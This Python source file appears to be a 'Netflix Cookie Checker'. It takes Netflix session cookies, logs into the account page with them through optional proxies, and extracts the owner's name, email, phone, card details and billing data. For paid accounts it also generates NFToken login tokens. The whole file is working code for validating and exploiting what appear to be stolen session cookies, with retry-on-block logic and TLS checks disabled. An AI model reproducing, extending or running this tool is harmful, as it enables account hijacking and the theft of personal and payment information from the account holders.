
def derive_plan_info(info, is_subscribed):
    raw_plan = decode_netflix_value(info.get("localizedPlanName"))
    raw_quality = decode_netflix_value(info.get("videoQuality"))
    streams = _int_or_none(info.get("maxStreams"))

    if not is_subscribed and not raw_plan:
        return "free", "Free"

    normalized = normalize_plan_key(raw_plan) if raw_plan else ""

    plan_aliases = {
        "premium": {"premium", "cao_cap", "高級", "高级", "ozel", "พรีเมียม", "프리미엄", "プレミアム"},
        "standard_with_ads": {"standard_with_ads", "standardwithads", "광고형_스탠다드", "standard_avec_pub", "広告付きスタンダード"},
        "standard": {"standard", "estandar", "padrao", "標準", "标准", "スタンダード", "standaard", "القياسية"},
        "basic": {"basic", "basico", "basique", "basis", "基本", "베이직", "ベーシック", "temel", "พื้นฐาน"},
        "mobile": {"mobile", "ponsel", "seluler", "movil", "มือถือ", "모바일", "モバイル"},
    }
    for canonical, aliases in plan_aliases.items():
        if normalized in aliases:
            return canonical, canonical.replace("_", " ").title()

    if streams is not None:
        quality_norm = normalize_plan_key(raw_quality) if raw_quality else ""
        if streams >= 4 or quality_norm in {"uhd", "ultra_hd", "4k"}:
            return "premium", "Premium"
        if streams >= 2 or quality_norm in {"hd", "full_hd"}:
            return "standard", "Standard"
        if streams == 1:
            return "basic", "Basic"

    if raw_plan:
        return normalize_plan_key(raw_plan), raw_plan
    if not is_subscribed:
        return "free", "Free"
    return "unknown", "Unknown"


def is_extra_member_account(info):
    if not isinstance(info, dict):
        return False
    explicit_flag = decode_netflix_value(info.get("isExtraMemberAccount"))
    if explicit_flag:
        lowered_flag = explicit_flag.strip().lower()
        if lowered_flag in {"yes", "true", "1"}:
            return True
        if lowered_flag in {"no", "false", "0"}:
            return False
    localized_plan = decode_netflix_value(info.get("localizedPlanName")) or ""
    membership_status = decode_netflix_value(info.get("membershipStatus")) or ""
    candidates = [localized_plan, membership_status]
    markers_text = ("extra member", "miembro extra", "suscriptor extra", "membro extra", "assinante extra",
                     "abbonato extra", "abonné supplémentaire", "abonent extra", "ekstra üye", "额外成员", "額外成員", "추가 회원")
    for value in candidates:
        if not value:
            continue
        lowered = value.lower()
        if any(marker in lowered for marker in markers_text):
            return True
    return False


def is_subscribed_account(info):
    status = normalize_plan_key((info or {}).get("membershipStatus"))
    if status == "current_member":
        return True
    return is_extra_member_account(info)


def is_on_hold_account(info):
    hold_value = format_boolean_label((info or {}).get("holdStatus"))
    if hold_value is not None:
        return hold_value == "Yes"
    membership_status = normalize_plan_key((info or {}).get("membershipStatus"))
    return any(token in membership_status for token in ("hold", "past_due", "payment_retry", "paused", "suspend"))


def normalize_output_value(value, unknown_fallback="UNKNOWN"):
    cleaned = decode_netflix_value(value)
    if cleaned is None or cleaned == "":
        return unknown_fallback
    lowered = str(cleaned).strip().lower()
    if lowered in {"false", "none", "null"}:
        return "N/A"
    return cleaned


def normalize_phone_number(value, country_code=None):
    cleaned = decode_netflix_value(value)
    if not cleaned:
        return None
    if str(cleaned).startswith("+"):
        return cleaned
    digits = re.sub(r"\D+", "", str(cleaned))
    if not digits:
        return cleaned
    normalized_country = (decode_netflix_value(country_code) or "").strip().upper()
    dial_prefix_map = {"IN": "91"}
    dial_prefix = dial_prefix_map.get(normalized_country)
    if dial_prefix and digits.startswith("0") and len(digits) >= 10:
        return f"+{dial_prefix}{digits.lstrip('0')}"
    return cleaned


def parse_localized_date(cleaned):
    if not cleaned:
        return None
    for parser in ("%Y-%m-%d", "%Y-%m-%dT%H:%M:%S", "%Y-%m-%dT%H:%M:%S.%f", "%Y-%m-%dT%H:%M:%S.%f%z"):
        try:
            return datetime.strptime(cleaned, parser)
        except Exception:
            continue
    numeric_parts = [int(part) for part in re.findall(r"\d+", cleaned)]
    if len(numeric_parts) >= 3:
        first, second, third = numeric_parts[0], numeric_parts[1], numeric_parts[2]
        try:
            if 1900 <= first <= 3000 and 1 <= second <= 12 and 1 <= third <= 31:
                return datetime(first, second, third)
        except Exception:
            pass
    raw_lower = cleaned.lower()
    simplified = unicodedata.normalize("NFKD", raw_lower)
    simplified = "".join(ch for ch in simplified if not unicodedata.combining(ch))
    month = None
    for alias, alias_month in MONTH_ALIASES.items():
        if alias in raw_lower or alias in simplified:
            month = alias_month
            break
    if month is None:
        return None
    year = None
    for number in numeric_parts:
        if 1900 <= number <= 3000:
            year = number
            break
    if year is None:
        return None
    day = 1
    for number in numeric_parts:
        if number == year:
            continue
        if 1 <= number <= 31:
            day = number
            break
    try:
        return datetime(year, month, day)
    except Exception:
        return None


def format_display_date(value):
    cleaned = decode_netflix_value(value)
    if not cleaned:
        return "UNKNOWN"
    parsed = parse_localized_date(cleaned)
    if parsed is not None:
        return parsed.strftime("%B %d, %Y").replace(" 0", " ")
    return cleaned


def format_member_since(value):
    cleaned = decode_netflix_value(value)
    if not cleaned:
        return "UNKNOWN"
    parsed = parse_localized_date(cleaned)
    if parsed is not None:
        return parsed.strftime("%B %Y")
    numeric_parts = re.findall(r"\d+", cleaned)
    if len(numeric_parts) >= 2:
        try:
            month = int(numeric_parts[0])
            year = int(numeric_parts[-1])
            if 1 <= month <= 12 and 1900 <= year <= 3000:
                parsed = datetime(year, month, 1)
                return parsed.strftime("%B %Y")
        except Exception:
            pass
    return cleaned


def create_nftoken(cookie_dict, attempts=1):
    netflix_id = decode_netflix_value(cookie_dict.get("NetflixId"))
    if not netflix_id:
        return None
    headers = dict(NFTOKEN_HEADERS)
    headers["Cookie"] = f"NetflixId={netflix_id}"
    try:
        attempts = max(1, int(attempts))
    except Exception:
        attempts = 1
    for _ in range(attempts):
        try:
            response = requests.get(NFTOKEN_API_URL, params=NFTOKEN_QUERY_PARAMS, headers=headers, timeout=30, verify=False)
            if response.status_code != 200:
                continue
            data = response.json()
            token_data = (((data.get("value") or {}).get("account") or {}).get("token") or {}).get("default") or {}
            token = decode_netflix_value(token_data.get("token"))
            expires = token_data.get("expires")
            if token:
                return {
                    "token": token,
                    "expires_at_utc": get_nftoken_expiry_utc(expires),
                }
        except Exception:
            continue
    return None


def get_nftoken_expiry_utc(expires=None):
    normalized = decode_netflix_value(expires)
    if isinstance(normalized, str):
        normalized = normalized.strip()
        if normalized.isdigit():
            try:
                normalized = int(normalized)
            except Exception:
                normalized = None
    if isinstance(normalized, (int, float)):
        try:
            timestamp = int(normalized)
            if len(str(abs(timestamp))) == 13:
                timestamp //= 1000
            return datetime.fromtimestamp(timestamp, tz=timezone.utc).strftime("%Y-%m-%d %H:%M:%S UTC")
        except Exception:
            pass
    return (datetime.utcnow() + timedelta(hours=1)).strftime("%Y-%m-%d %H:%M:%S UTC")


def get_account_page(session, proxy=None, request_timeout=15, fallback_account_page=False):
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
        "Accept-Encoding": "identity",
    }
    membership_url = "https://www.netflix.com/account/membership"
    response = session.get(membership_url, headers=headers, proxies=proxy, timeout=request_timeout)
    if response.status_code == 200 and response.text:
        primary_info = extract_info(response.text)
        if not fallback_account_page or has_complete_account_info(primary_info):
            return response.text, response.status_code, primary_info
        fallback_info = None
        try:
            fallback_response = session.get("https://www.netflix.com/YourAccount", headers=headers, proxies=proxy, timeout=request_timeout)
            if fallback_response.status_code == 200 and fallback_response.text:
                fallback_info = extract_info(fallback_response.text)
        except Exception:
            fallback_info = None
        return response.text, response.status_code, merge_info(primary_info, fallback_info)
    return response.text, response.status_code, None


def check_single_cookie(cookie_content, config=None, proxy=None):
    if config is None:
        config = copy.deepcopy(DEFAULT_CONFIG)
    
    retries_cfg = config.get("retries", {})
    performance_cfg = config.get("performance", {})
    max_retry_attempts = retries_cfg.get("error_proxy_attempts", 3)
    nftoken_retry_attempts = retries_cfg.get("nftoken_attempts", 1)
    request_timeout_seconds = performance_cfg.get("request_timeout_seconds", 15)
    fallback_account_page = bool(performance_cfg.get("fallback_account_page", False))
    retry_incomplete_info = bool(performance_cfg.get("retry_incomplete_info", False))
    nftoken_for_free = bool(performance_cfg.get("nftoken_for_free", False))
    
    try:
        max_retry_attempts = max(1, int(max_retry_attempts))
    except Exception:
        max_retry_attempts = 3
    try:
        nftoken_retry_attempts = max(1, int(nftoken_retry_attempts))
    except Exception:
        nftoken_retry_attempts = 1
    try:
        request_timeout_seconds = max(5, int(request_timeout_seconds))
    except Exception:
        request_timeout_seconds = 15
    
    retryable_status_codes = {403, 429, 500, 502, 503, 504}
    
    bundles = extract_netflix_cookie_bundles(cookie_content)
    if not bundles:
        return {"success": False, "error": "No valid Netflix cookies found in input"}
    
    bundle = bundles[0]
    netscape_content = bundle.get("netscape_text", "")
    cookies = bundle.get("cookies") or cookies_dict_from_netscape(netscape_content)
    
    if not cookies or not has_required_netflix_cookies(cookies):
        return {"success": False, "error": "Missing required cookies (NetflixId required)"}
    
    session = requests.Session()
    session.cookies.update(cookies)
    
    response_text = None
    status_code = None
    extracted_info = None
    
    for attempt in range(max_retry_attempts):
        try:
            response_text, status_code, extracted_info = get_account_page(
                session, proxy, request_timeout_seconds, fallback_account_page
            )
            if status_code == 200 and response_text:
                if retry_incomplete_info and attempt < max_retry_attempts - 1:
                    if not (extracted_info and has_complete_account_info(extracted_info)):
                        continue
                break
            if status_code in retryable_status_codes and attempt < max_retry_attempts - 1:
                continue
            break
        except Exception:
            if attempt < max_retry_attempts - 1:
                continue
    
    if status_code == 200 and response_text:
        info = extracted_info or extract_info(response_text)
        if info.get("countryOfSignup") and info.get("countryOfSignup") != "null":
            is_subscribed = is_subscribed_account(info)
            account_on_hold = is_subscribed and is_on_hold_account(info)
            
            result = {
                "success": True,
                "is_subscribed": is_subscribed,
                "is_on_hold": account_on_hold,
                "account_details": {}
            }
            
            txt_fields = config.get("txt_fields", {})
            field_mapping = {
                "name": ("accountOwnerName", normalize_output_value),
                "email": ("email", normalize_output_value),
                "country": ("countryOfSignup", normalize_output_value),
                "member_since": ("memberSince", format_member_since),
                "next_billing": ("nextBillingDate", format_display_date),
                "payment_method": ("paymentMethodType", normalize_output_value),
                "card": ("maskedCard", lambda v: normalize_output_value(v, "N/A")),
                "phone": ("phoneDisplay", normalize_output_value),
                "quality": ("videoQuality", normalize_output_value),
                "max_streams": ("maxStreams", lambda v: normalize_output_value(str(v).rstrip("}"))),
                "plan_price": ("planPrice", lambda v: normalize_output_value(v, "N/A")),
                "hold_status": ("holdStatus", normalize_output_value),
                "extra_members": ("showExtraMemberSection", normalize_output_value),
                "email_verified": ("emailVerified", normalize_output_value),
                "membership_status": ("membershipStatus", normalize_output_value),
                "profiles": ("profilesDisplay", normalize_output_value),
                "user_guid": ("userGuid", normalize_output_value),
            }
            
            for field_key, (info_key, formatter) in field_mapping.items():
                if txt_fields.get(field_key, True):
                    value = info.get(info_key)
                    if value is not None:
                        result["account_details"][field_key] = formatter(value)
                    else:
                        result["account_details"][field_key] = "UNKNOWN" if field_key != "card" else "N/A"
            
            result["plan"] = derive_plan_info(info, is_subscribed)[1]
            result["profile_count"] = info.get("profileCount")
            
            if is_subscribed and config.get("nftoken"):
                nftoken_data = create_nftoken(cookies, nftoken_retry_attempts)
                if nftoken_data:
                    result["nftoken"] = nftoken_data
            elif nftoken_for_free and not is_subscribed:
                nftoken_data = create_nftoken(cookies, nftoken_retry_attempts)
                if nftoken_data:
                    result["nftoken"] = nftoken_data
            
            return result
        else:
            return {"success": False, "error": "Incomplete account page - could not extract country"}
    
    if status_code in retryable_status_codes:
        error_messages = {403: "HTTP 403 Forbidden", 429: "HTTP 429 Rate Limited", 500: "HTTP 500 Server Error",
                          502: "HTTP 502 Bad Gateway", 503: "HTTP 503 Service Unavailable", 504: "HTTP 504 Gateway Timeout"}
        return {"success": False, "error": error_messages.get(status_code, f"HTTP {status_code}")}
    
    return {"success": False, "error": "Failed to access account page"}


def check_multiple_cookies(cookie_inputs, config=None, proxy=None):
    if isinstance(cookie_inputs, str):
        cookie_inputs = [cookie_inputs]
    
    results = []
    for cookie_content in cookie_inputs:
        result = check_single_cookie(cookie_content, config, proxy)
        results.append(result)
    
    return results


def main():
    print(BANNER)
    print("\nNetflix Cookie Checker - Direct Input Mode")
    print("=" * 50)
    print("\nEnter your Netflix cookies (Netscape format, JSON, or raw cookie string)")
    print("Press Enter twice when done:\n")
    
    lines = []
    empty_count = 0
    while True:
        try:
            line = input()
            if line.strip() == "":
                empty_count += 1
                if empty_count >= 2:
                    break
            else:
                empty_count = 0
            lines.append(line)
        except EOFError:
            break
    
    cookie_input = "\n".join(lines).strip()
    
    if not cookie_input:
        print("No cookie input provided. Exiting.")
        return
    
    config = load_config()
    
    try:
        proxy_input = input("\nProxy (optional, format: ip:port or user:pass@ip:port, press Enter to skip): ").strip()
        proxy = None
        if proxy_input:
            if "://" not in proxy_input:
                if "@" in proxy_input:
                    proxy = {"http": f"http://{proxy_input}", "https": f"http://{proxy_input}"}
                else:
                    proxy = {"http": f"http://{proxy_input}", "https": f"http://{proxy_input}"}
            else:
                proxy = {"http": proxy_input, "https": proxy_input}
    except EOFError:
        proxy = None
    
    print("\nChecking cookie...\n")
    
    result = check_single_cookie(cookie_input, config, proxy)
    
    print("=" * 50)
    print("RESULT:")
    print("=" * 50)
    print(json.dumps(result, indent=2, ensure_ascii=False))
    
    input("\nPress Enter to exit...")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n\nStopped by user.")
